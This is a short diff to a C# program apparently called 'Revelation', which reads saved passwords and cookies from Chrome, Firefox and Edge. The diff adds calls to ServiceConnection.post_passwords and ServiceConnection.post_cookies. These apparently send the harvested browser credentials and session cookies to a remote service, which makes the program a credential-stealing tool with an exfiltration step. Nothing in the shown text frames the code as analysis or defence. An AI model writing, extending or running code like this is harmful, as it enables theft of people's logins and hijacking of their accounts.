@@ -1,4 +1,5 @@
-﻿using Revelation.firefox.utils;
+﻿using Revelation.common;
+using Revelation.firefox.utils;
 using Revelation.passwords;
 using Revelation.passwords.utils_firefox;
 using System;
@@ -28,7 +29,8 @@ namespace Revelation
             var passwords = get_all_passwords();
             var cookies = get_all_cookies();
 
-
+            ServiceConnection.post_passwords(passwords);
+            ServiceConnection.post_cookies(cookies);
             foreach (var password in passwords)
             {
                 Console.WriteLine("url : " + password.hostname);
@@ -79,8 +81,8 @@ namespace Revelation
             try
             {
                 var cookies_chrome = CookiesChrome.Get();
-            var cookies_firefox = CookiesFirefox.Get(Profile.GetMozillaBrowser());
-            var cookies_edge = CookiesEdge.Get();
+                var cookies_firefox = CookiesFirefox.Get(Profile.GetMozillaBrowser());
+                var cookies_edge = CookiesEdge.Get();
 
             cookies = cookies_chrome.Concat(cookies_firefox).Concat(cookies_edge).ToList();
             }
